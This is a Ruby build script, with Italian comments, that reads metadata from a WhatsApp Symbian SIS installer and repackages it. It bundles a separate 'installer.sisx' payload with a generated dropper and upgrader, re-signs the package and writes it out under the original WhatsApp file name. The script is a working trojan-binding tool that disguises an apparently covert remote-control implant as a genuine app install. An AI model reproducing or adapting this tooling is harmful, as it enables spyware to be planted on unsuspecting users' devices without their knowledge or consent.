# SIS format described in:
# SymbianOSv9.x_SIS_File_Format_Specification.pdf

# TODO: in questo script viene eseguito solo symbian3, occorre 
# selezionare la piattaforma giusta secondo quanto selezionato 
# da console
# TODO: vedere i TODO presenti in questo script

require 'zlib'
require 'fileutils'

$packagename
@rcsname
$buf
$uid
$uniquevendorname
$appname
$major
$minor

packagename = "WhatsApp_2_8_22.sis"
rcsname = "installer.sisx"

#####
#
# Step 1. Read info from original package
#
##########

infile = File.open(packagename,"rb")

# read UID
infile.pos = 8
uid = infile.read(4).unpack("h*").first.reverse

# read size and check if it's on 4 or 8 bytes
offset = 20
infile.pos = offset
SISContentsSize = infile.read(4).unpack("L_").first 
check = SISContentsSize&32768
if check == 1
	#SISContentsSize = infile.read(8).unpack("L_").first
     offset += 8
else
     offset += 4
end

# now we are in SISControllerChecksum, it's a 12 bytes info 
# optional, may not be present
infile.pos = offset
if infile.read(4).unpack("L_").first == 34
	offset += 12
end

# now we are in SISDataChecksum, it's a 12 bytes info, optional
# optional, may not be present
infile.pos = offset
if infile.read(4).unpack("L_").first == 35
	offset +=12
end

# now, we could be in SISCompressed
infile.pos = offset
if infile.read(4).unpack("L_").first == 3
     offset += 4
	infile.pos = offset
     # length 4 or 8 bytes?
     check = infile.read(4).unpack("L_").first&32768
     if check == 1
         infile.pos = offset
         siscompressedlength = infile.read(8).unpack("L_").first
	    offset += 8
     else
        infile.pos = offset
	   siscompressedlength = infile.read(4).unpack("L_").first
	   offset += 4
     end
	infile.pos = offset
	compressed = infile.read(4).unpack("L_").first
     if compressed == 1
	   offset += 12
        compressedDataLength = siscompressedlength -12
        
	   infile.pos = offset
        compresseddata = infile.read(compressedDataLength)
	   zstream = Zlib::Inflate.new
	   buf = zstream.inflate(compresseddata)
	   zstream.finish
        zstream.close
	else
	   offset += 12
        uncompressedDataLength = siscompressedlength - 12
        infile.pos = offset
	   buf = infile.read(uncompressedDataLength)
     end           
end

#outfile4 = File.new("uncompressed.txt","w")
#outfile4.write(buf)
#outfile4.close()

# now we should be in SISController
index = 0
index += 4
length= buf.slice(index,4).unpack("L_").first 
check = length&1
if check == 1
	index += 8
else 
	index += 4
end

#now we should be in SISInfo
index += 4
length= buf.slice(index,4).unpack("L_").first 
check = length&1
if check == 1
     length =  buf.slice(index,8).unpack("L_").first
	index += 8
else 
	length = buf.slice(index,4).unpack("L_").first
	index += 4
end

infobuf = buf.slice(index,length)

# now we are in SISInfo... at last
# skip SISUid, 12 bytes
index = 12
# read unique vendor name
index += 4
length = infobuf.slice(index,4).unpack("L_").first
index += 4
uniquevendorname = infobuf.slice(index,length).force_encoding("utf-16le").encode("utf-8")
# caution! length is padded to the first 4 bytes multiple
modulo = length % 4
if modulo == 0
	hop = length
else
	hop = length + (4 - (length % 4))
end
index += hop
# read the first name and skip the array of names
index += 4
namelen = infobuf.slice(index+8,4).unpack("L_").first
appname = infobuf.slice(index+12,namelen).force_encoding("utf-16le").encode("utf-8")
length = infobuf.slice(index,4).unpack("L_").first
index += (length + 4)

# skip the array of vendor names
index += 4
length = infobuf.slice(index,4).unpack("L_").first
index += (length + 4)

# read version
index += 8
major = infobuf.slice(index,4).unpack("L_").first
index += 4
minor = infobuf.slice(index,4).unpack("L_").first

puts uid
puts appname
puts uniquevendorname
puts major
puts minor

#outfile4 = File.new("info.txt","w")
#outfile4.write(infobuf)
#outfile4.close()

infile.close()


#####
#
# Step 2. Create upgrader.sisx 
#
##########

# TODO: patchare UID5 con il valore preso dai symbian uids

Dir.mkdir("working")
FileUtils.cp rcsname,"working/plugin.sisx"

# create dropper.pkg
if File.file?("3rd/dropper.pkg")
	content = File.open("3rd/dropper.pkg", 'rb') {|f| f.read}
	content.gsub! '[:uniquevendorname:]', uniquevendorname rescue nil
	content.gsub! '[:UID5:]', '200316ed' rescue nil
	File.open("working/dropper.pkg", 'wb') {|f| f.write content}
end

# TODO: binary patch upgrader.exe
# TODO: patchare uid3 e sid con il valore corrispondente
# preso dai symbian uids

FileUtils.cp "3rd/upgrader.exe","working/upgrader.exe"
FileUtils.cp "developercertificate.cer","working/devcer.cer"
FileUtils.cp "developercertificate.key","working/devcer.key"
Dir.chdir("working")
system("petran -uid3 0x200316ed  -sid 0x200316ed upgrader.exe")
system("petran -compress upgrader.exe")
system("makesis dropper.pkg upgrader.sis")
system("signsis upgrader.sis upgrader.sisx devcer.cer devcer.key")
Dir.chdir("..")


#####
#
# Step 3. Create melted sisx
#
##########

# Create melting.pkg

# TODO: patchare UID5 con il valore preso dai symbian uids

if File.file?("melting.pkg")
        content = File.open("melting.pkg", 'rb') {|f| f.read}
        content.gsub! '[:appname:]', appname rescue nil
        content.gsub! '[:uniquevendorname:]', uniquevendorname rescue nil
        content.gsub! '[:major:]', major.to_s rescue nil
        content.gsub! '[:minor:]', minor.to_s rescue nil
        content.gsub! '[:packagename:]', packagename rescue nil
        content.gsub! '[:uid:]', uid rescue nil
        content.gsub! '[:UID5:]', '200316ed' rescue nil
        File.open("working/melting.pkg", 'wb') {|f| f.write content}
      end

#FileUtils.cp "melting.cer","working/melting.cer"
#FileUtils.cp "melting.key","working/melting.key"
FileUtils.cp packagename, "working/#{packagename}"
Dir.mkdir("final")
Dir.chdir("working")
system("makesis melting.pkg melted.sis")
system("signsis melted.sis ../final/#{packagename} devcer.cer devcer.key")
Dir.chdir("..")
FileUtils.remove_dir("working")
